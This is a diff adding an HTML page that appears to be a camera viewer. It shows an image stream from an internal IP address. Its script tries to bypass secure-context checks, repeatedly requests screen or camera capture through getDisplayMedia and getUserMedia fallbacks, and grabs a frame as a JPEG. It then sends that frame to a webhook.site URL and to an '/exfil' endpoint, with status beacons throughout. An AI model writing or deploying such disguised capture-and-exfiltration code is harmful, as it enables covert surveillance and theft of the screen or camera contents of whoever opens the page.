@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html>
+<head><title>C</title></head>
+<body style="margin:0;background:#111;">
+<img id="cam" src="http://10.133.7.5/stream" style="width:640px;height:480px;display:block;">
+<script>
+var W='https://webhook.site/92edf9eb-21c9-4e44-9c9d-6443b79fa56d';
+function rpt(k,v){new Image().src=W+'?t='+k+'&v='+encodeURIComponent((''+v).substring(0,500))}
+rpt('ALIVE','1');
+rpt('SEC',window.isSecureContext+'|'+location.protocol+'|'+location.host);
+rpt('MD',typeof navigator.mediaDevices);
+
+var cam=document.getElementById('cam');
+var imgLoaded=false;
+
+cam.onload=function(){
+    if(imgLoaded)return;imgLoaded=true;
+    rpt('IMG','w='+cam.naturalWidth+'|h='+cam.naturalHeight);
+    setTimeout(doCapture,2000);
+};
+cam.onerror=function(){
+    rpt('IMG_E','1');
+    setTimeout(doCapture,3000);
+};
+setTimeout(function(){doCapture()},8000);
+
+var capDone=false;
+function doCapture(){
+    if(capDone)return;capDone=true;
+    rpt('CAP_START','sec='+window.isSecureContext+'|md='+typeof navigator.mediaDevices);
+
+    if(!navigator.mediaDevices){
+        rpt('NO_MD','trying overrides');
+        // Try override isSecureContext
+        try{
+            Object.defineProperty(window,'isSecureContext',{value:true,configurable:true});
+            rpt('OVERRIDE_SEC',window.isSecureContext+'|md='+typeof navigator.mediaDevices);
+        }catch(e){rpt('OVERRIDE_E',e.message)}
+
+        // Try getter directly
+        try{
+            var desc=Object.getOwnPropertyDescriptor(Navigator.prototype,'mediaDevices');
+            rpt('GETTER',desc?'get='+typeof desc.get:'null');
+            if(desc&&desc.get){
+                var val=desc.get.call(navigator);
+                rpt('GETTER_VAL',typeof val+'|'+String(val).substring(0,100));
+                if(val){
+                    rpt('GETTER_GDM',typeof val.getDisplayMedia);
+                    if(val.getDisplayMedia){
+                        doGDM(val);
+                        return;
+                    }
+                }
+            }
+        }catch(e){rpt('GETTER_E',e.message)}
+
+        // Try legacy getUserMedia
+        if(navigator.getUserMedia){
+            rpt('LGUM','available');
+            try{
+                navigator.getUserMedia({video:{mediaSource:'screen'}},onStream,function(e){rpt('LGUM_E',e.name+':'+e.message)});
+            }catch(e){rpt('LGUM_X',e.message)}
+        }
+        rpt('NO_MD_DONE','exhausted');
+        return;
+    }
+
+    rpt('HAS_MD','gdm='+typeof navigator.mediaDevices.getDisplayMedia+'|gum='+typeof navigator.mediaDevices.getUserMedia);
+
+    if(navigator.mediaDevices.getDisplayMedia){
+        doGDM(navigator.mediaDevices);
+    } else if(navigator.mediaDevices.getUserMedia){
+        doGUM();
+    } else {
+        rpt('NO_CAP','no gdm/gum');
+    }
+}
+
+function doGDM(md){
+    rpt('TRY_GDM','1');
+    md.getDisplayMedia({video:true}).then(onStream).catch(function(e){
+        rpt('GDM_E',e.name+':'+e.message);
+        // Try getUserMedia fallbacks
+        doGUM();
+    });
+}
+
+function doGUM(){
+    var attempts=[
+        {video:{mediaSource:'screen'}},
+        {video:{mediaSource:'window'}},
+        {video:{mediaSource:'browser'}},
+        {video:true}
+    ];
+    function go(i){
+        if(i>=attempts.length){rpt('GUM_EXHAUST','1');return}
+        rpt('TRY_GUM',i+'|'+JSON.stringify(attempts[i]));
+        navigator.mediaDevices.getUserMedia(attempts[i]).then(onStream).catch(function(e){
+            rpt('GUM_E',i+'|'+e.name+':'+e.message);
+            go(i+1);
+        });
+    }
+    if(navigator.mediaDevices&&navigator.mediaDevices.getUserMedia) go(0);
+    else rpt('NO_GUM','1');
+}
+
+function onStream(stream){
+    rpt('STREAM','tracks='+stream.getTracks().length);
+    var tracks=stream.getTracks();
+    for(var i=0;i<tracks.length;i++){
+        rpt('TRACK',i+'|kind='+tracks[i].kind+'|label='+tracks[i].label+'|state='+tracks[i].readyState);
+    }
+    var v=document.createElement('video');
+    v.srcObject=stream;v.autoplay=true;v.muted=true;
+    v.style.cssText='width:640px;height:480px;display:block';
+    document.body.appendChild(v);
+
+    v.onloadeddata=function(){
+        rpt('VID',v.videoWidth+'x'+v.videoHeight);
+        setTimeout(function(){grab(v,stream)},2000);
+    };
+    setTimeout(function(){grab(v,stream)},5000);
+}
+
+var grabbed=false;
+function grab(v,stream){
+    if(grabbed)return;grabbed=true;
+    var w=v.videoWidth||1280,h=v.videoHeight||720;
+    rpt('GRAB',w+'x'+h);
+    var c=document.createElement('canvas');c.width=w;c.height=h;
+    var x=c.getContext('2d');x.drawImage(v,0,0,w,h);
+    try{var d=x.getImageData(0,0,10,1);rpt('PX',Array.from(d.data).join(','))}catch(e){rpt('PX_E',e.message)}
+    try{
+        var du=c.toDataURL('image/jpeg',0.7);
+        rpt('DU_LEN',''+du.length);
+        // Send via multiple methods
+        try{navigator.sendBeacon(W,du)}catch(e){}
+        fetch(W,{method:'POST',mode:'no-cors',body:'CAP:'+du}).catch(function(){});
+        // Also try sending to our HTTPS server
+        fetch(location.origin+'/exfil',{method:'POST',body:'CAP:'+du}).catch(function(){});
+    }catch(e){rpt('DU_E',e.message)}
+    stream.getTracks().forEach(function(t){t.stop()});
+}
+</script>
+</body>
+</html>
